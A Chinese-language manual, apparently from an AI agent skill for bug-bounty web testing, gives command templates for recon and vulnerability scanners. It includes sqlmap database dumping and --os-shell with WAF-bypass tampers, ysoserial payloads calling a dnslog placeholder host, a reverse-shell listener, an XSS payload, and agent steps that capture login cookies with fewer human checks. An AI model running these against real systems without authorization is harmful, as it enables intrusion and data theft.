# 工具使用手册 (Tool Usage)

> 配套 [tool-config.md](tool-config.md) 的 **实战命令模板**。
> 每个工具列出: 用途 / 适用阶段 / 典型命令 / 输出处理。
> 优先用本文件的工具组合, 而非 references/recon.md 中的国际开源默认工具。

---

## 工具速查表 (按场景)

| 阶段 | 漏洞挖掘场景 | 推荐工具(按优先级) |
|------|-------------|-------------------|
| Phase 1 | 子域名收集 | **oneforall** > enscan |
| Phase 1 | 企业信息(分公司/备案/微信小程序/APP) | **enscan** |
| Phase 1 | 端口扫描 / 服务识别 | **nmap** > fscan(批量) |
| Phase 1 | 存活探测 + 状态码 | **httpx** |
| Phase 1 | Web 指纹识别 | **ehole** + **P1finger** (互补) |
| Phase 1 | TLS/SSL 检测 | **sslscan** |
| Phase 1 | WAF 识别 | **wafw00f** |
| Phase 1 | 目录爆破 | **dirsearch** |
| Phase 1 | 通用漏洞扫描 | **nuclei** > **xray** > **afrog** (三件套交叉) |
| Phase 1 | 内网综合扫描 | **fscan** (批量发现 + 内置 PoC) |
| Phase 2 | SQL 注入 | **sqlmap** |
| Phase 2 | XSS 检测 | **xsstrike** |
| Phase 2 | Java 反序列化(Fastjson/Shiro/Weblogic) | **ysoserial** |
| Phase 2 | Spring Boot 专项(actuator/heapdump) | **springboot_scan** |
| Phase 2 | Swagger / OpenAPI 接口测试 | **swagger_hack** |
| Phase 2 | 前端 webpack/JS 分析 | **packerfuzzer** |
| Phase 2 | 主动扫描(被动+主动) | **xray** |
| Phase 2 | AD/内网渗透(本 skill 范围外, 仅识别) | nxc / fscan |
| Phase 2 | 国产 PoC 库快扫 | **afrog** |
| Phase 4 | 备用扫描器交叉验证 | rscan / xscan / serein / pppscan |

---

## Tier 1 — 核心工具(每次渗透必用)

### nuclei

**用途**: 模板化漏洞扫描, CVE / 信息泄露 / 默认凭证 / 配置不当一站式
**配置路径**: `E:/onefox30/.../tools/gui_scan/nuclei/`

```bash
# 严重 + 高危(优先)
${NUCLEI_PATH}/nuclei.exe -l urls.txt -severity critical,high -o nuclei_critical.txt

# 全部 CVE
${NUCLEI_PATH}/nuclei.exe -l urls.txt -tags cve -o nuclei_cve.txt

# 信息泄露(最容易拿分)
${NUCLEI_PATH}/nuclei.exe -l urls.txt -tags exposure,token,misconfig,debug -o nuclei_exposure.txt

# 子域名接管
${NUCLEI_PATH}/nuclei.exe -l subs.txt -tags takeover -o nuclei_takeover.txt

# 默认凭证
${NUCLEI_PATH}/nuclei.exe -l urls.txt -tags default-login,default-creds -o nuclei_creds.txt

# 云相关
${NUCLEI_PATH}/nuclei.exe -l urls.txt -tags aws,azure,gcp,cloud,alibaba,tencent -o nuclei_cloud.txt

# 模板更新
${NUCLEI_PATH}/nuclei.exe -update-templates
```

**7 大 Phase 分桶工作流** (推荐: 按优先级顺序依次跑, 产物分文件便于过滤):

```bash
# Phase A: 严重/高危 (P0 优先看)
${NUCLEI_PATH}/nuclei.exe -l urls.txt -severity critical,high -o A_critical_high.txt -stats -silent

# Phase B: CVE
${NUCLEI_PATH}/nuclei.exe -l urls.txt -tags cve -o B_cve.txt -stats -silent

# Phase C: 敏感暴露 / 凭证 / 配置错误
${NUCLEI_PATH}/nuclei.exe -l urls.txt -tags exposure,token,misconfig,debug -o C_exposure.txt -stats -silent

# Phase D: 默认凭证
${NUCLEI_PATH}/nuclei.exe -l urls.txt -tags default-login,default-creds -o D_default_creds.txt -stats -silent

# Phase E: 云相关 (AWS / Azure / GCP / 阿里 / 腾讯)
${NUCLEI_PATH}/nuclei.exe -l urls.txt -tags aws,azure,gcp,cloud,alibaba,tencent -o E_cloud.txt -stats -silent

# Phase F: 子域名接管
${NUCLEI_PATH}/nuclei.exe -l urls.txt -tags takeover -o F_takeover.txt -stats -silent

# Phase G: 管理面板 / 登录页
${NUCLEI_PATH}/nuclei.exe -l urls.txt -tags panel,login -o G_panels.txt -stats -silent
```

### httpx

**用途**: 大批量 URL 存活探测 + 技术指纹 + 标题
**配置路径**: `E:/onefox30/.../tools/gui_scan/fcke/`

```bash
# 子域名 → 存活 + 指纹
cat all_subs.txt | ${HTTPX_PATH}/httpx.exe -silent -tech-detect -status-code -title -cdn -o alive.txt

# 仅过滤 200
cat alive.txt | ${HTTPX_PATH}/httpx.exe -mc 200 -silent -o alive_200.txt

# 提取 IP
${HTTPX_PATH}/httpx.exe -l urls.txt -ip -silent -o url_ip.txt

# 截图(配合 chromedp, 可选)
${HTTPX_PATH}/httpx.exe -l urls.txt -screenshot -o screenshots/
```

### dirsearch

**用途**: 目录与敏感文件爆破
**配置路径**: `D:/CTFtools/web/dirsearch-master/` (Python)

```bash
# 基础扫描(默认字典)
python ${DIRSEARCH_PATH}/dirsearch.py -u https://target.com -t 50 \
    -x 404,403 -o dirsearch_target.txt

# 多扩展
python ${DIRSEARCH_PATH}/dirsearch.py -u https://target.com \
    -e php,asp,aspx,jsp,html,json,bak,zip,sql,git,env,yml \
    -t 100 -o ds_full.txt

# SecLists 敏感路径(更全, 自己装一次即可)
python ${DIRSEARCH_PATH}/dirsearch.py -u https://target.com \
    -w ${SECLISTS_PATH}/Discovery/Web-Content/quickhits.txt -t 50 -o ds_sensitive.txt

# 备份文件专扫 (dirsearch 自带 -e 扩展名)
python ${DIRSEARCH_PATH}/dirsearch.py -u https://target.com \
    -e bak,bak2,old,tar.gz,tgz,zip,rar,7z,sql,sql.gz,swp,git,svn,env,yml,DS_Store \
    -t 50 -o ds_backup.txt
```

### sqlmap

**用途**: SQL 注入自动化
**配置路径**: `D:/CTFtools/web/sqlmap/` (Python)

```bash
# 基础
python ${SQLMAP_PATH}/sqlmap.py -u "URL" --batch --random-agent

# 用 Burp 抓包
python ${SQLMAP_PATH}/sqlmap.py -r request.txt --batch --level=3 --risk=2

# 中国 WAF 绕过组合 (TOP 推荐)
python ${SQLMAP_PATH}/sqlmap.py -r request.txt \
    --tamper=space2mysqlblank,between,charencode,charunicodeencode --batch

# 提取数据
python ${SQLMAP_PATH}/sqlmap.py -r request.txt --dbs
python ${SQLMAP_PATH}/sqlmap.py -r request.txt -D dbname --tables
python ${SQLMAP_PATH}/sqlmap.py -r request.txt -D dbname -T users --dump

# OS Shell(高危, 仅授权)
python ${SQLMAP_PATH}/sqlmap.py -r request.txt --os-shell

# 二阶注入
python ${SQLMAP_PATH}/sqlmap.py -r request.txt --second-url="https://target.com/profile"
```

> 详见 [vuln/sqli.md](vuln/sqli.md) §sqlmap 实战

### xray

**用途**: 主动 + 被动 Web 漏洞扫描(国产, 国内业务匹配度高)
**配置路径**: `D:/CTFtools/web/xray/`

```bash
# 主动扫描
${XRAY_PATH}/xray.exe webscan --url https://target.com --html-output xray_target.html

# 批量
${XRAY_PATH}/xray.exe webscan --url-file urls.txt --html-output xray_batch.html

# 被动: Burp 上游代理 → xray 监听
${XRAY_PATH}/xray.exe webscan --listen 127.0.0.1:7777 --html-output xray_passive.html
# Burp Proxy → Options → Upstream Proxy → 127.0.0.1:7777

# 配合 nuclei 跑互补
${XRAY_PATH}/xray.exe webscan --url-file urls.txt --plugins phantasm,sqldet,xss,ssrf,xxe \
    --html-output xray_targeted.html
```

---

## Tier 2 — 信息收集(Phase 1 高频)

### oneforall (子域名)

**用途**: 国产子域名收集器, 整合多个数据源(被动 + 暴力 + 证书透明度)
**配置路径**: `E:/onefox30/.../tools/gui_shouji/oneforall/` (Python)

```bash
# 基础: 单目标
python ${ONEFORALL_PATH}/oneforall.py --target target.com run

# 批量
python ${ONEFORALL_PATH}/oneforall.py --targets domains.txt run

# 仅被动(快, 不触碰目标)
python ${ONEFORALL_PATH}/oneforall.py --target target.com --brute False --enable_takeover_check False run

# 输出在 oneforall/results/target.com.csv 或 .json
# 提取存活子域名:
cut -d',' -f2 ${ONEFORALL_PATH}/results/target.com.csv | grep -v "^subdomain$" > subs.txt
```

### enscan (企业信息收集)

**用途**: 国内特有, 通过爱企查/天眼查类信息找子公司、备案、微信公众号、小程序、APP, 扩大资产边界
**配置路径**: `D:/CTFtools/web/enscan-v1.3.1-windows-amd64/`

```bash
# 基础: 查企业全资产
${ENSCAN_PATH}/enscan-v1.3.1-windows-amd64.exe -n "目标公司全称"

# 输出 包含:
# - 企业基本信息
# - 子公司/控股公司(便于 SRC 定 scope)
# - ICP 备案的所有域名
# - APP / 小程序 / 公众号
# - 招投标信息(可能暴露技术栈)

# 输出到 JSON
${ENSCAN_PATH}/enscan-v1.3.1-windows-amd64.exe -n "目标公司" -o results.json
```

> **赏金价值**: enscan 找到的关联子公司 / 历史域名 / 老备案站, 往往是赏金边角料但容易出洞。

### nmap

**用途**: 端口扫描 + 服务版本
**配置路径**: `D:/CTFtools/web/Zenmap7.95汉化版/map/Nmap/`

```bash
# TOP 1000 端口快扫
${NMAP_PATH}/nmap.exe -sS -T4 --top-ports 1000 -oN nmap_quick.txt TARGET

# 全端口
${NMAP_PATH}/nmap.exe -sS -p- -T4 -oN nmap_full.txt TARGET

# 服务版本 + 默认脚本
${NMAP_PATH}/nmap.exe -sV -sC -p PORTS -oN nmap_detail.txt TARGET

# 漏洞脚本扫描
${NMAP_PATH}/nmap.exe --script=vuln -p PORTS -oN nmap_vuln.txt TARGET

# Windows 上的 ncat 反弹/正向连接
${NMAP_PATH}/ncat.exe -lvnp 4444   # 监听
${NMAP_PATH}/ncat.exe TARGET 4444  # 连接
```

### ehole + P1finger (指纹识别)

**用途**: 国产 Web 应用指纹库, 识别 CMS / 框架 / OA / 国产中间件
**互补**: ehole 偏综合, P1finger 偏 SaaS / 工控

```bash
# ehole - 单目标
${EHOLE_PATH}/EHole_windows_amd64.exe finger -u https://target.com

# ehole - 批量
${EHOLE_PATH}/EHole_windows_amd64.exe finger -l urls.txt -o ehole_results.txt

# P1finger - 单目标
${P1FINGER_PATH}/P1finger64.exe -u https://target.com

# P1finger - 批量
${P1FINGER_PATH}/P1finger64.exe -uf urls.txt -o p1finger_results.txt
```

> **黄金组合**: ehole + P1finger 两个跑一遍, 国内 OA / CMS / 政企系统识别率比 wappalyzer 高很多。

### sslscan

**用途**: TLS/SSL 配置审计(弱算法 / 过期证书 / Heartbleed 等)
**配置路径**: `D:/CTFtools/web/sslscan-2.2.1/`

```bash
${SSLSCAN_PATH}/sslscan.exe target.com:443

# 仅检查特定漏洞
${SSLSCAN_PATH}/sslscan.exe --no-failed --show-certificate target.com:443

# 输出 XML
${SSLSCAN_PATH}/sslscan.exe --xml=ssl.xml target.com:443
```

### wafw00f

**用途**: WAF 识别
**配置路径**: `D:/CTFtools/web/wafw00f-master/`

```bash
python ${WAFW00F_PATH}/wafw00f.py https://target.com

# 详细
python ${WAFW00F_PATH}/wafw00f.py -v https://target.com

# 批量
python ${WAFW00F_PATH}/wafw00f.py -i urls.txt
```

> 识别后 → 翻 [waf-bypass.md](waf-bypass.md) 找对应厂商绕过技巧。

---

## Tier 3 — 专项扫描

### afrog

**用途**: 国产快速漏洞扫描, PoC 库覆盖国内常见 CMS / 中间件 / 网络设备
**配置路径**: `E:/onefox30/.../tools/gui_other/afrog/`

```bash
# 单目标
${AFROG_PATH}/afrog.exe -t https://target.com

# 批量
${AFROG_PATH}/afrog.exe -T urls.txt -o afrog_results.html

# 指定严重级别
${AFROG_PATH}/afrog.exe -T urls.txt -s critical,high

# 指定 PoC 标签(国内常见: 通达OA / 蓝凌OA / 用友 / 金蝶 / 致远 / 泛微 / 帆软)
${AFROG_PATH}/afrog.exe -t URL -tag tongdaoa,landray,yonyou,kingdee,seeyon,weaver,fanruan
```

> **与 nuclei 的互补**: nuclei 偏国际 CVE; afrog 偏国产软件 PoC。两个都跑。

### fscan

**用途**: 内网综合扫描器(虽然本 skill 不做内网, 但 fscan 用于外网批量发现 + Web Banner + 弱口令也很好用)
**配置路径**: `E:/onefox30/.../tools/gui_scan/fscan/`

```bash
# 单 IP / 段
${FSCAN_PATH}/fscan.exe -h 1.2.3.4
${FSCAN_PATH}/fscan.exe -h 1.2.3.4/24

# 批量
${FSCAN_PATH}/fscan.exe -hf ip_list.txt

# 仅扫指定端口
${FSCAN_PATH}/fscan.exe -h 1.2.3.4 -p 80,443,8080,8443,7001,9090,3306,6379

# Web 模式
${FSCAN_PATH}/fscan.exe -u https://target.com

# 不弱口令 / 不漏洞探测(被动模式)
${FSCAN_PATH}/fscan.exe -h 1.2.3.4 -nopoc -nobr
```

> **赏金外网**: fscan 内置的 Web 标题 + 弱口令 + 国内 CVE PoC 跑一遍, 有时能直接命中默认凭证。

### ysoserial

**用途**: Java 反序列化 payload 生成(Fastjson / Shiro / Weblogic / Common Collections)
**配置路径**: `E:/onefox30/.../tools/gui_scan/yso/`

```bash
# 列出所有 gadget
java -jar ${YSOSERIAL_PATH}/ysoserial.jar

# 生成 CommonsCollections6 payload(最常用)
java -jar ${YSOSERIAL_PATH}/ysoserial.jar CommonsCollections6 'whoami' > payload.bin

# 配合 base64 直接嵌入 Cookie / Header
java -jar ${YSOSERIAL_PATH}/ysoserial.jar CommonsCollections6 'cmd' | base64 -w 0

# URLDNS(盲检测, 看 DNS 请求)
java -jar ${YSOSERIAL_PATH}/ysoserial.jar URLDNS "http://yourname.dnslog.cn" | base64 -w 0
```

> 详见 [vuln/deserialize.md](vuln/deserialize.md)

### swagger_hack

**用途**: 自动从 swagger.json / openapi.json 解析所有接口并尝试调用, 发现未授权
**配置路径**: `D:/CTFtools/web/swagger-hack-main/`

```bash
# 自动发现 + 测试
python ${SWAGGER_HACK_PATH}/swagger-hack.py -u https://target.com/v2/api-docs

# 输出每个接口的请求/响应, 找出 200 + 敏感数据
```

> **赏金高频**: 看到 `/swagger-ui.html` / `/v2/api-docs` 立即上 swagger_hack。

### xsstrike

**用途**: XSS 自动化探测(智能 payload 生成)
**配置路径**: `D:/CTFtools/web/XSStrike-master/`

```bash
# 基础
python ${XSSTRIKE_PATH}/xsstrike.py -u "https://target.com/?q=test"

# POST
python ${XSSTRIKE_PATH}/xsstrike.py -u "URL" --data "param=test"

# 爬取后批量测
python ${XSSTRIKE_PATH}/xsstrike.py -u https://target.com --crawl
```

> 详见 [vuln/xss.md](vuln/xss.md)

### springboot_scan

**用途**: Spring Boot 专项扫描(actuator / env / heapdump / Eureka)
**配置路径**: `E:/onefox30/.../tools/gui_scan/spring/`

```bash
# 单目标
python ${SPRINGBOOT_SCAN_PATH}/SpringBoot-Scan.py -u https://target.com

# 批量
python ${SPRINGBOOT_SCAN_PATH}/SpringBoot-Scan.py -uf urls.txt
```

> **必查 endpoint**: `/actuator` / `/actuator/env` / `/actuator/heapdump` / `/actuator/beans` / `/actuator/configprops` / `/actuator/mappings`

### packerfuzzer

**用途**: 解析前端 webpack 打包文件, 自动提取所有 API 端点 + 敏感字符串
**配置路径**: `E:/onefox30/.../tools/gui_scan/webpackscan/`

```bash
python ${PACKERFUZZER_PATH}/PackerFuzzer.py -u https://target.com -t web -o packerfuzzer_target/

# 移动端
python ${PACKERFUZZER_PATH}/PackerFuzzer.py -u https://target.com -t app -o packerfuzzer_app/

# 结果在 PackerFuzzer/Reports/{target}/, 含:
# - 所有发现的 URL/接口
# - 提取的密钥/Token 候选
# - 中文敏感关键字
```

> **黄金价值**: 现代 SPA 站点用 packerfuzzer 跑出的接口数, 通常是 katana 爬取的 5-10 倍。

---

## Tier 4 — 备用扫描器(交叉验证)

| 工具 | 路径 | 主要场景 |
|------|------|---------|
| rscan | `E:/.../gui_scan/Rscan/` | nuclei 之外的二次确认 |
| xscan | `E:/.../gui_scan/xscan/` | 老式国产漏扫(政企系统) |
| pppscan | `E:/.../gui_scan/pppscan/` | 极速端口扫描(masscan 的国产替代) |
| serein | `E:/.../gui_scan/serein/` | Python 漏扫, 适合自定义 |

```bash
# 一般在 nuclei + afrog + xray 三件套漏报时, 才用这些做"再确认"
${RSCAN_PATH}/Rscan_win64.exe -h target.com
${XSCAN_PATH}/xscan.exe -t target.com
${PPPSCAN_PATH}/pppscan.exe -h CIDR -p 1-65535 --rate 50000
python ${SEREIN_PATH}/Serein.py -u https://target.com
```

---

## Tier 5 — 浏览器自动化 MCP (Browser Automation)

> **用途**: DOM XSS / Client-side SSTI / postMessage / OAuth 回调 / 动态渲染页面抓取 等**必须真浏览器**的场景。
> **替代**: 把一部分原本要 HITL 让用户手动点的任务, 改由 AI 直接驱动浏览器完成。

### 5.1 streamable-mcp-server 配置

项目或用户级 settings.json:

```json
{
  "mcpServers": {
    "streamable-mcp-server": {
      "type": "streamable-http",
      "url": "http://127.0.0.1:12306/mcp"
    }
  }
}
```

**前置**: 在 `~/.claude/settings.json` 或项目 `.claude/settings.json` 添加后, **重启 Claude Code** 使 MCP 加载。加载成功后, 工具列表会出现 `mcp__streamable-mcp-server__*` 系列。

### 5.2 典型调用场景

| 场景 | 为什么必须用浏览器 | 替代 HITL |
|------|-------------------|-----------|
| DOM XSS 验证 | curl 看到的 HTML ≠ 浏览器渲染结果 | ✅ 不必请用户看弹框 |
| Client-side SSTI (AngularJS 1.x / Vue 2) | 表达式在客户端求值, 非服务端 | ✅ |
| postMessage 跨源攻击 | 需要两个窗口 | ✅ |
| OAuth redirect_uri 跟链 | 多次 302 + fragment 解析 | ✅ |
| CSP 实际生效测试 | curl 看 header, 但浏览器实际执行情况不同 | ✅ |
| 登录后 Cookie / Token 抓取 | 登录流程含 JS 签名 / 指纹 | ✅ 大幅降低 HITL |
| SPA 全部 API 请求发现 | SPA 请求靠 JS 触发, 静态爬不到 | ✅ |
| 富文本 HTML 注入实际渲染 | 受害者视角才是真判据 | ✅ |

### 5.3 减少 HITL 请求的对照

| 以前必须 HITL | 现在可以 MCP 自动 |
|---------------|------------------|
| 请用户看浏览器是否弹框 | MCP screenshot / evaluate 检查 alert hook |
| 请用户复制 Cookie / Token | MCP get_cookies / local_storage |
| 请用户在 DevTools Network 找请求 | MCP network_log 过滤 |
| 请用户看 Console 报错 | MCP console_log |
| 请用户截图证明 | MCP screenshot |

**仍需 HITL** (MCP 做不了):
- 真实手机 / 邮箱验证码
- 需要破解的图形验证码 / 滑块
- APK 静态逆向 (jadx 图形化操作)
- 真机 Frida / 硬件交互

### 5.4 使用前探测

AI 每次需要浏览器时先探测 MCP 是否就绪:

```
1. 检查可用工具是否含 mcp__streamable-mcp-server__*
   ├─ 是 → 按 §5.5 模板调用
   └─ 否 → 回退到 HITL 协议 [human-in-the-loop.md], 并提醒"配置 MCP 可自动化"
```

### 5.5 常见调用序列模板

#### 模板 A: DOM XSS 端到端验证

```
1. navigate(url=f"https://target.com/#<img src=x onerror=alert(1)>")
2. screenshot()                                       # 证据
3. evaluate(js="return !!window.__xss_fired")         # 若 payload 注入了 flag
4. console_log()                                      # 查 CSP 报错 / 弹框
5. 将结果写入 vulns.md 作为 Proof
```

#### 模板 B: 登录抓 Cookie 为后续 BOLA 做准备

```
1. navigate(login_url)
2. type(selector="#username", text=user_a)
3. type(selector="#password", text=pw_a)
4. click(selector="button[type=submit]")
5. wait_for_navigation()
6. get_cookies(domain="target.com")        →  保存为 account_a.json
7. 对 account_b 重复 1-6                    →  account_b.json
8. 退出 MCP, AI 用 curl/httpx 带 2 份 cookie 交叉测 BOLA
```

#### 模板 C: SPA 全量 API endpoint 发现

```
1. navigate(root_url)
2. 按 tab 遍历所有功能模块 (click 导航项)
3. network_log() 过滤 xhr/fetch
4. 导出所有 /api/* 请求 → 作为 Phase 2 测试清单
```

> 实际工具名以该 MCP 暴露的 schema 为准; 以上 navigate / evaluate / screenshot / get_cookies / network_log 是通用命名约定。

### 5.6 安全边界

- ❌ 不在 MCP 浏览器登录用户真实私人账号 (除非用户明确授权测试账号)
- ❌ 不碰 scope 外的目标
- ⚠️ 默认 UA 带 HeadlessChrome 特征, 对高敏目标需 override
- ✅ 测完 `close` / `reset`, 避免会话残留
- ✅ 敏感操作 (提交表单到生产 / 真金额支付) 先走 HITL 再 MCP

---

## 工作流推荐组合 (按 Phase)

### Phase 1 信息收集(全量)

```bash
# Step 1: 子域名(用 oneforall)
python ${ONEFORALL_PATH}/oneforall.py --target target.com run

# Step 2: 企业关联(用 enscan)
${ENSCAN_PATH}/enscan-v1.3.1-windows-amd64.exe -n "目标公司"

# Step 3: 存活探测(用 httpx)
cat all_subs.txt | ${HTTPX_PATH}/httpx.exe -silent -tech-detect -status-code -title -o alive.txt

# Step 4: 端口扫描(用 nmap, 仅高价值 IP)
${NMAP_PATH}/nmap.exe -sS -sV -T4 --top-ports 1000 -oN nmap.txt -iL ips.txt

# Step 5: 指纹识别(ehole + P1finger 互补)
${EHOLE_PATH}/EHole_windows_amd64.exe finger -l alive.txt -o ehole.txt
${P1FINGER_PATH}/P1finger64.exe -uf alive.txt -o p1finger.txt

# Step 6: WAF 识别
python ${WAFW00F_PATH}/wafw00f.py -i alive.txt

# Step 7: 目录爆破 (SecLists quickhits 或 dirsearch 自带 db)
python ${DIRSEARCH_PATH}/dirsearch.py -l alive.txt -w ${SECLISTS_PATH}/Discovery/Web-Content/quickhits.txt -o ds.txt

# Step 8: 自动化漏扫(三件套)
${NUCLEI_PATH}/nuclei.exe -l alive.txt -severity critical,high -o nuclei.txt
${AFROG_PATH}/afrog.exe -T alive.txt -s critical,high -o afrog.html
${XRAY_PATH}/xray.exe webscan --url-file alive.txt --html-output xray.html

# Step 9: 前端 JS 提接口(用 packerfuzzer)
python ${PACKERFUZZER_PATH}/PackerFuzzer.py -u https://target.com -t web

# Step 10: Spring Boot 专项(若识别到)
python ${SPRINGBOOT_SCAN_PATH}/SpringBoot-Scan.py -uf alive.txt

# Step 11: Swagger / OpenAPI
python ${SWAGGER_HACK_PATH}/swagger-hack.py -u https://target.com/v2/api-docs
```

### Phase 2 漏洞挖掘(按发现物路由)

```bash
# 见 SQL 注入点 → sqlmap
python ${SQLMAP_PATH}/sqlmap.py -r request.txt --batch --level=3

# 见输入反射 → xsstrike
python ${XSSTRIKE_PATH}/xsstrike.py -u "URL?q=test"

# 见 Java 序列化(Fastjson/Shiro) → ysoserial 生成 payload
java -jar ${YSOSERIAL_PATH}/ysoserial.jar CommonsCollections6 'curl http://yourname.dnslog.cn' | base64 -w 0
```

---

## 与本仓库其他文件的对应关系

| 当 references 提到的工具 | 你已配置的等价工具 | 说明 |
|------------------------|----------------|------|
| `subfinder` / `amass` | **oneforall** | 国产子域收集 |
| `gobuster` / `ffuf` | **dirsearch** | 你已有 |
| `wappalyzer` / `whatweb` | **ehole** + **P1finger** | 国产识别更准 |
| `nuclei` | **nuclei** | 你已有 |
| `sqlmap` | **sqlmap** | 你已有 |
| `XSStrike` / `Dalfox` | **xsstrike** | 你已有 |
| `ysoserial` | **ysoserial** | 你已有 |
| `LinkFinder` / `SecretFinder` | **packerfuzzer** | 国产更全 |
| `arjun` / `paramspider` | (未配置, 可选 swagger_hack 部分覆盖) | — |
| `katana` / `gospider` | (未配置, packerfuzzer 部分覆盖) | — |
| `crackmapexec` | **nxc** (NetExec) | 你已有(本 skill 范围外) |

> **AI 决策原则**: references 文件里写的是"通用思路", 实际执行时优先用 tool-config.md 配置的工具(本文件命令模板)。

---

## 工具不存在的降级策略

每个工具未配置时的回退方案:

| 缺失工具 | 降级方案 |
|---------|---------|
| oneforall | 用证书透明度 `curl -s "https://crt.sh/?q=%.target.com&output=json" \| jq -r '.[].name_value' \| sort -u` |
| enscan | 手工查爱企查 / ICP 备案查询 |
| nmap | 用 PowerShell `Test-NetConnection` 或 `pppscan` |
| ehole / P1finger | curl 看响应头 + 主页 HTML |
| afrog | 仅 nuclei + xray |
| ysoserial | 在线生成: marshalsec / fastjson-payload-generator |
| swagger_hack | 手工 GET `/v2/api-docs` 然后 jq 解析 |
| xsstrike | 手工 + Burp Intruder |

---

## tool-config 维护建议

未来如果你新增工具, 编辑 `tool-config.md` 加一行即可。本文件 (`tool-usage.md`) 只在新增**用法/场景**时才需要更新命令模板。

**未来可能要补的工具**(若你后续配置):
- `katana` (前端深度爬虫, packerfuzzer 已部分覆盖)
- `arjun` (隐藏参数发现)
- `frida` + `objection` (移动端 hook, mobile-app.md 已覆盖)
- `apktool` + `jadx` (APK 逆向, mobile-app.md 已覆盖)

---

*本文件随 tool-config.md 同步更新。每次扫描时由 SKILL.md 一并加载缓存路径, 后续命令直接使用。*
